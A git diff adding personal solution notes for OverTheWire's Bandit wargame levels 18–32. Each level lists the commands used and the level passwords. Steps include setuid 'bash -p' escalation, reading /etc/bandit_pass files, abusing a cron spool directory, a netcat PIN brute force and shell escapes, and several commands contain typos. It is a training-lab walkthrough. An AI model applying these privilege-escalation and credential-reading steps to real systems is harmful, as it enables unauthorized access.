@@ -209,12 +209,185 @@ diff passwords.old passwords.new
 
 kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
 
+#Bandit level 18
 
+ssh bandit18@bandit.labs.overthewire.org -p 2220 bash
 
+cat readme
 
+IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
 
+#Bandit level 19
 
+ssh bandit19@bandit.labs.overthewire.org -p 2220
 
+file bandit20-do
+./bandit20-do bash -p
+cat /etc/bandit_pass/bandit20
 
+GbKksEFF4yrVs6il55v6gwY5aVje5f0j
 
+#Bandit level 20
 
+ssh bandit20@bandit.labs.overthewire.org -p 2220
+
+./suconnect 5757
+nc -nlvp 5757
+
+gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+
+#Bandit level 21
+
+ssh bandit21@bandit.labs.overthewire.org -p 2220
+
+ls /etc/cron.d/
+cat /etc/cron.d/cronjob_bandit22
+cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+#Bandit level 22
+
+ssh bandit22@bandit.labs.overthewire.org -p 2220
+
+ls /etc/cron.d/
+cat /etc/cron.d/cronjob_bandit23
+cat /etc/cron.d/cronjob_bandit23
+echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+#Bandit level 23
+
+ssh bandit2@bandit.labs.overthewire.org -p 2220
+
+ls /etc/cron.d/
+cat /etc/cron.d/cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+mktemp -d
+chmod o+rwx ../tmp/tmp.zcUAerUVfS
+touch script.sh
+chmos +c script.sh
+nano script.sh
+        #!/bin/bash 
+
+        cat /etc/bandit_pass/bandit24 > /tmp/tmp.zcUAerUVfS/pass.txt
+
+cp script.sh /var/spool/bandit24/script.sh
+watch -n 1 ls -l
+
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+#Bandit level 24
+
+ssh bandit24@bandit.labs.overthewire.org -p 2220
+
+mktemp -d
+cd /tmp/tmp.SgWhQSsgP9
+touch script.sh
+nano script.sh
+        #!/bin/bash
+
+        for i in {0000..9999};do
+	        echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
+        done
+./script.sh > dictionary.txt
+cat dictionary.txt | nc localhost 30002 | grep -v -E "Wrong|Please"
+
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+#Bandit level 25
+
+ssh bandit25@bandit.labs.overthewire.org -p 2220
+
+ssh -i bandit26.sshkey bandit26@localhost
+#redimenzionar shell a un tamano mas pequeno, v > shit: > e /etc/bandit_pass/bandit26
+#spawn shell ":shell=/bin/bash " > ":shell"
+
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+#Bandit level 26
+
+ssh bandit26@bandit.labs.overthewire.org -p 2220
+
+./bandit27-do whoami
+./bandit27-do bash -p
+cat /etc/bandit_pass/bandit27
+3ba3118a22e93127a4ed485be72ef5ea
+
+#Bandit level 27
+
+ssh bandit27@bandit.labs.overthewire.org -p 2220
+
+mktemp -d
+cd /tmp/tmp.VH5h71ffkQ
+git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
+cat repo/README
+
+0ef186ac70e04ea33b4c1853d2526fa2
+
+#Bandit level 28
+
+ssh bandit28@bandit.labs.overthewire.org -p 2220
+
+mktemp -d
+/tmp/tmp.Z4gDSXdVVT
+git clone ssh://bandit29-git@localhost/home/bandit28-git/repo
+cd repo
+git log -p
+
+bbc96594b4e001778eee9975372716b2
+
+#Bandit level 29
+
+ssh bandit29@bandit.labs.overthewire.org -p 2220
+
+mktemp -d
+/tmp/tmp.ZAdHQQQQDc
+git clone ssh://bandit29-git@localhost/home/bandit29-git/repo
+cd repo
+git branch -r
+git log -p
+
+5b90576bedb2cc04c86a9e924ce42faf
+
+#Bandit level 30
+
+ssh bandit30@bandit.labs.overthewire.org -p 2220
+
+mktemp -d
+/tmp/tmp.oFWEybHTD0
+git clone ssh://bandit30-git@localhost/home/bandit30-git/repo
+cd repo
+git tag
+git show secret
+
+47e603bb428404d265f59c42920d81e5
+
+#Bandit level 31
+
+ssh bandit31@bandit.labs.overthewire.org -p 2220
+
+mktemp -d
+cd /tmp/tmp.giVN3bHXDu
+git clone ssh://bandit31-git@localhost/home/bandit30-git/repo
+cd repo
+touch key.txt
+echo "May I come in?" > key.txt
+git add key.txt
+cat .gitignore
+rm .gitignore
+git add key.txt
+git commit -m "Agregamos clave"
+git push -u origin master
+
+56a9bf19c63d650ce78e6ec0354ee45e
+
+#Bandit level 32
+
+ssh bandit32@bandit.labs.overthewire.org -p 2220
+
+$0
+
+c9c3199ddf4121b10cf581a98d51caee
